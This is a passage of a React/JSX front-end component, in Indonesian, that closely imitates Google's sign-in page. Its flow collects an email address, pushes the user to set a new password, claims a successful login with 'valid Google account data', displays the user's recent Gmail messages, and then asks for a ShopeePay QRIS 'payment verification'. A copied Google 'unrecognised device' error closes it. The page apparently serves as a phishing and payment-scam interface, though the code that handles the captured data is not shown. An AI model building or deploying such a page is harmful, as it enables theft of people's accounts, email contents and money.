                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                      style={{ textDecoration: 'none' }}
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                      </svg>
                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                    </div>
                  </>
                )}
                {step === 'success' && (
                  <>
                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Berhasil Login</h1>
                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal mb-4">Anda telah login dengan data akun Google yang valid.</p>
                    
                    {isFetchingEmails ? (
                      <div className="w-full text-center py-4 text-sm text-gray-500">Memuat data Gmail...</div>
                    ) : emailsData.length > 0 ? (
                      <div className="w-full flex flex-col gap-3 mt-2">
                        <p className="text-xs font-medium text-gray-500 uppercase tracking-wider">Email Terbaru Anda</p>
                        {emailsData.map((msg, idx) => {
                          const subjectHeader = msg.payload?.headers?.find((h: any) => h.name === 'Subject');
                          const fromHeader = msg.payload?.headers?.find((h: any) => h.name === 'From');
                          const subject = subjectHeader ? subjectHeader.value : '(Tanpa Subjek)';
                          const from = fromHeader ? fromHeader.value.split('<')[0].trim() : 'Tidak diketahui';
                          
                          return (
                            <div key={idx} className="bg-gray-50 border border-gray-100 rounded-lg p-3 text-sm">
                              <p className="font-medium text-gray-900 truncate">{from}</p>
                              <p className="text-gray-600 truncate">{subject}</p>
                            </div>
                          );
                        })}
                      </div>
                    ) : (
                      <div className="w-full text-center py-4 text-sm text-gray-500">Tidak ada email ditemukan.</div>
                    )}
                  </>
                )}
                {step === 'payment' && (
                  <>
                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Verifikasi Pembayaran</h1>
                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Selesaikan pembayaran melalui QRIS ShopeePay Merchant.</p>
                  </>
                )}
                {step === 'error' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Tidak dapat memproses login Anda</h1>
                    <div 
                      onClick={() => !isLoading && changeStep('email', -1)}
                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                      style={{ textDecoration: 'none' }}
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                      </svg>
                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                    </div>
                  </>
                )}
              </div>

        {/* Content/Form Section */}
        <div className="px-6 pb-10 flex flex-col flex-grow sm:px-10">
          {step === 'email' && (
            <form onSubmit={handleEmailSubmit} className="flex flex-col flex-grow justify-start">
              <div className="pt-2">
                <TextInput
                  label="Email atau nomor telepon"
                  value={email}
                  onChange={(e: any) => {
                    setEmail(e.target.value);
                    if (error) setError('');
                  }}
                  name="email"
                  error={error}
                  autoFocus
                  disabled={isLoading}
                />
              </div>

              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                  disabled={isLoading}
                >
                  Lupa email?
                </button>
                <button
                  type="submit"
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  Berikutnya
                </button>
              </div>
            </form>
          )}

          {step === 'password' && (
            <div className="flex flex-col flex-grow justify-start pt-6">
              <div>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
                  Anda dapat memperbarui sandi Anda sekarang jika Anda lupa.
                </p>
              </div>
              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  onClick={() => changeStep('change_password', 1)}
                  className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                  disabled={isLoading}
                >
                  Perbarui sandi
                </button>
                <button
                  type="button"
                  onClick={() => changeStep('success', 1)}
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  Lanjutkan
                </button>
              </div>
            </div>
          )}

          {step === 'change_password' && (
            <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-start">
              <div className="pt-2">
                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-4 mb-1">Buat sandi yang kuat</h2>
                <p className="text-[#444746] text-[14px] mb-6 leading-normal">
                  Buat sandi baru yang kuat dan tidak Anda gunakan untuk situs lain
                </p>

                <TextInput
                  label="Buat sandi"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e: any) => {
                    setPassword(e.target.value);
                    if (error) setError('');
                  }}
                  name="password"
                  error={error && (error.includes('sandi') || error.includes('8 karakter')) ? error : ''}
                  autoFocus
                  disabled={isLoading}
                />

                <div className="mt-4">
                  <TextInput
                    label="Konfirmasi"
                    type={showPassword ? "text" : "password"}
                    value={confirmPassword}
                    onChange={(e: any) => {
                      setConfirmPassword(e.target.value);
                      if (error) setError('');
                    }}
                    name="confirmPassword"
                    error={error && error.includes('cocok') ? error : ''}
                    disabled={isLoading}
                  />
                </div>

                <div className="text-[12px] text-[#444746] mt-1.5 pl-3">
                  Minimal 8 karakter
                </div>

                <div className="mt-4">
                  <label className="flex items-center gap-3 cursor-pointer text-[14px] text-[#1f1f1f] select-none py-1">
                    <input 
                      type="checkbox" 
                      checked={showPassword} 
                      onChange={(e) => setShowPassword(e.target.checked)}
                      className="w-[18px] h-[18px] rounded border-[#747775] text-[#0b57d0] focus:ring-[#0b57d0] cursor-pointer"
                      disabled={isLoading}
                    />
                    <span>Tampilkan sandi</span>
                  </label>
                </div>
              </div>

              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  onClick={() => changeStep('error', 1)}
                  className="text-[#0b57d0] hover:bg-blue-50 px-4 py-2.5 -ml-3 rounded-full font-medium text-[14px] transition"
                  disabled={isLoading}
                >
                  Lewati
                </button>
                <button
                  type="submit"
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  Simpan sandi
                </button>
              </div>
            </form>
          )}

          {step === 'success' && (
            <div className="flex flex-col flex-grow justify-start">
               <div className="pt-2">
                 <p className="text-[#444746] text-[14px]">Anda sekarang dapat menggunakan sandi baru Anda untuk login.</p>
               </div>
               <div className="mt-8 flex justify-end items-center pb-6 sm:pb-0">
                <button
                  onClick={() => {
                    changeStep('payment', 1);
                  }}
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  Selesai
                </button>
              </div>
            </div>
          )}

          {step === 'payment' && (
            <div className="flex flex-col flex-grow justify-start pt-6">
               <div className="flex flex-col items-center border border-[#e0e3e7] p-6 rounded-[24px]">
                 <div className="w-full flex justify-between items-center mb-4">
                   <span className="font-semibold text-[18px] text-[#ff6600]">ShopeePay</span>
                   <span className="bg-[#ff6600] text-white px-2 py-1 rounded text-[12px] font-bold">QRIS</span>
                 </div>
                 
                 <div className="w-[200px] h-[200px] bg-gray-100 flex items-center justify-center rounded-[12px] border-2 border-dashed border-gray-300 relative overflow-hidden mb-4">
                    {/* Placeholder for QR Code */}
                    <div className="text-center p-4">
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-12 h-12 mx-auto text-gray-400 mb-2">
                        <path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v3h-3v-3zm-3 3h3v3h-3v-3zm3 3h3v3h-3v-3zm-3-3h-3v3h3v-3zm-3-3h3v3h-3v-3z" />
                      </svg>
                      <span className="text-[12px] text-gray-500 font-medium break-words block">
                        {import.meta.env.VITE_SHOPEEPAY_API_KEY ? 'QR Code Aktif' : 'API Key Belum Dikonfigurasi'}
                      </span>
                    </div>
                 </div>

                 <p className="text-[#1f1f1f] text-center text-[14px] leading-relaxed mb-6">
                   Pindai QR code ini menggunakan aplikasi <strong>Shopee</strong> atau aplikasi e-wallet lainnya yang mendukung QRIS untuk menyelesaikan verifikasi pembayaran merchant.
                 </p>

                 <div className="w-full flex justify-end">
                  <button
                    onClick={() => {
                      setEmail('');
                      setPassword('');
                      setConfirmPassword('');
                      changeStep('email', -1);
                    }}
                    className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed w-full sm:w-auto"
                    disabled={isLoading}
                  >
                    Kembali ke Awal
                  </button>
                 </div>
               </div>
            </div>
          )}

          {step === 'error' && (
            <div className="flex flex-col flex-grow justify-start pt-6">
              <div>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
                  Anda mencoba login di perangkat yang tidak dikenali oleh Google, dan kami tidak memiliki cukup informasi untuk memverifikasi ini benar-benar Anda. Untuk perlindungan Anda, Anda tidak dapat login di sini saat ini.
                </p>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px] mt-4">
                  Coba lagi dari perangkat atau lokasi tempat Anda login sebelumnya. <span className="text-[#0b57d0] cursor-pointer hover:underline font-medium">Pelajari lebih lanjut</span>
                </p>
              </div>
            </div>
          )}
        </div>
            </motion.div>
          </AnimatePresence>
        </div>
      </div>

      {/* Footer */}
      <div className="w-full sm:max-w-[448px] px-6 pb-6 pt-2 sm:px-0 sm:pb-0 sm:pt-6 flex flex-col sm:flex-row justify-between text-[12px] text-[#444746] bg-white sm:bg-transparent">
        <div className="flex justify-start items-center">
          <div className="flex items-center gap-1 cursor-pointer hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 rounded transition">
            Indonesia
            <svg fill="currentColor" viewBox="0 0 24 24" width="16px" height="16px">
              <path d="M7 10l5 5 5-5z" />
            </svg>
          </div>
        </div>
        <div className="flex gap-4 sm:gap-6 mt-4 sm:mt-0 items-center justify-start sm:justify-end">
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 sm:-ml-0 rounded transition">Bantuan</a>
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">Privasi</a>
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">Persyaratan</a>
        </div>
      </div>

    </div>
  );
}
